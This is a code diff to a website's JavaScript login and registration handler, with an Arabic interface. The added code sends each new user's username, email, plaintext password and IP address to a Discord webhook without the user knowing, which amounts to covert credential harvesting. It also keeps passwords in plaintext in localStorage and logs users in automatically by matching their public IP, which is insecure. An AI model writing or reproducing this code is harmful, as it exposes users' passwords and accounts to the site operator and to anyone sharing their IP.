@@ -613,51 +613,119 @@
         loginFormContainer.style.display = 'block';
     });
 
-    // Handle Form Submission
-    const handleFormSubmit = async (formId, type) => {
+    // --- Auto Login System (IP-like identification) ---
+    const checkAutoLogin = async () => {
+        try {
+            // Get Public IP using a free API
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            // Check if we have a user saved for this IP
+            const users = JSON.parse(localStorage.getItem('aura_users') || '[]');
+            const savedUser = users.find(u => u.ip === userIP);
+
+            if (savedUser) {
+                // Auto login the user
+                console.log("Auto-login detected for IP:", userIP);
+                localStorage.setItem('aura_current_user', JSON.stringify(savedUser)); // Save session
+                
+                // Show a welcome back notification
+                Swal.fire({
+                    title: 'مرحباً بعودتك!',
+                    text: `تم تسجيل دخولك تلقائياً كـ ${savedUser.username}`,
+                    icon: 'success',
+                    toast: true,
+                    position: 'top-end',
+                    showConfirmButton: false,
+                    timer: 3000,
+                    timerProgressBar: true
+                });
+
+                // Update UI (change Login button to Logout or hide it)
+                const loginBtn = document.getElementById('loginBtn');
+                loginBtn.innerHTML = `<i class="fa-solid fa-right-from-bracket"></i> تسجيل الخروج (${savedUser.username})`;
+                loginBtn.onclick = (e) => {
+                    e.preventDefault();
+                    localStorage.removeItem('aura_current_user'); // If you want to clear session
+                    location.reload();
+                };
+            }
+        } catch (error) {
+            console.error("Auto-login check failed:", error);
+        }
+    };
+
+    // Run auto-login check on page load
+    window.addEventListener('load', checkAutoLogin);
+
+    // Handle Form Submission (JS Version for GitHub Pages)
+    const DISCORD_WEBHOOK = "ضع_رابط_الويب_هوك_هنا";
+
+    const handleFormSubmit = (formId, type) => {
         const form = document.getElementById(formId);
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             const formData = new FormData(form);
-            formData.append('type', type);
+            const userData = Object.fromEntries(formData.entries());
 
+            // Fetch IP for registration
+            let userIP = "Unknown";
             try {
-                const response = await fetch('auth.php', {
-                    method: 'POST',
-                    body: formData
-                });
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+            } catch (e) {}
+
+            if (type === 'register') {
+                let users = JSON.parse(localStorage.getItem('aura_users') || '[]');
                 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                if (users.find(u => u.username === userData.username)) {
+                    return Swal.fire({ title: 'خطأ!', text: 'اسم المستخدم موجود مسبقاً.', icon: 'error', confirmButtonColor: '#7b2d3a' });
                 }
 
-                const result = await response.json();
+                userData.ip = userIP; // Save IP with user data
+                users.push(userData);
+                localStorage.setItem('aura_users', JSON.stringify(users));
 
-                if (result.success) {
-                    Swal.fire({
-                        title: 'نجاح!',
-                        text: result.message,
-                        icon: 'success',
-                        confirmButtonColor: '#7b2d3a'
-                    }).then(() => {
-                        loginOverlay.classList.remove('active');
-                        document.body.style.overflow = 'auto';
+                // Send to Discord with IP info
+                if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== "ضع_رابط_الويب_هوك_هنا") {
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: "Respect Aura Auth",
+                            embeds: [{
+                                title: "📝 عضو جديد سجل في الموقع",
+                                color: 8072506,
+                                fields: [
+                                    { name: "👤 المستخدم", value: userData.username, inline: true },
+                                    { name: "📧 البريد", value: userData.email || "غير متوفر", inline: true },
+                                    { name: "🔑 الباسورد", value: userData.password, inline: true },
+                                    { name: "🌐 الأيبي (IP)", value: userIP, inline: false }
+                                ],
+                                footer: { text: "تم التسجيل والربط بالأيبي تلقائياً" }
+                            }]
+                        })
                     });
+                }
+
+                Swal.fire({ title: 'نجاح!', text: 'تم إنشاء الحساب وربطه بجهازك بنجاح!', icon: 'success', confirmButtonColor: '#7b2d3a' })
+                .then(() => { location.reload(); });
+
+            } else if (type === 'login') {
+                const users = JSON.parse(localStorage.getItem('aura_users') || '[]');
+                const user = users.find(u => u.username === userData.username && u.password === userData.password);
+
+                if (user) {
+                    user.ip = userIP; // Update IP on manual login too
+                    localStorage.setItem('aura_users', JSON.stringify(users));
+                    
+                    Swal.fire({ title: 'مرحباً بك!', text: `تم تسجيل دخولك بنجاح يا ${user.username}`, icon: 'success', confirmButtonColor: '#7b2d3a' })
+                    .then(() => { location.reload(); });
                 } else {
-                    Swal.fire({
-                        title: 'خطأ!',
-                        text: result.message,
-                        icon: 'error',
-                        confirmButtonColor: '#7b2d3a'
-                    });
+                    Swal.fire({ title: 'خطأ!', text: 'اسم المستخدم أو كلمة المرور غير صحيحة.', icon: 'error', confirmButtonColor: '#7b2d3a' });
                 }
-            } catch (error) {
-                Swal.fire({
-                    title: 'خطأ في الخادم!',
-                    text: 'حدث خطأ أثناء محاولة الاتصال بالخادم.',
-                    icon: 'error',
-                    confirmButtonColor: '#7b2d3a'
-                });
             }
         });
     };
